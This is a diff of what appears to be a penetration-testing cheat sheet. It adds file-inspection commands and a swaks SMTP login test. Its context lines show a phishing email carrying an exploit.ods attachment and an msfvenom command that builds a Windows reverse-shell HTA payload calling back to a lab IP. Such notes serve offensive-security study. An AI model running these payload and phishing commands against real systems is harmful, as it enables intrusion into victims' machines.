@@ -6,6 +6,10 @@
   
   ``` exiftool -a -u xxx.pdf ```
 
+- ``` stat {file} ``` see when the file access/modify/change etc
+
+- ``` file {file} ```
+
 # Useful splitter
 - Splitter.py 
     ```
@@ -123,7 +127,7 @@ Send email with given information e.g. receiver/sender, smtp server usrname pw
         -m 'Please check this spreadsheet' \
         -a exploit.ods 
     ```
-
+- Test login ``` swaks -server {ip} --auth LOGIN --auth-user {user email} --auth-password {password} --quit-after AUTH ```
 
 ## Exploit Libre Office
 1. Prepare payload ``` msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f hta-psh -o evil.hta ```
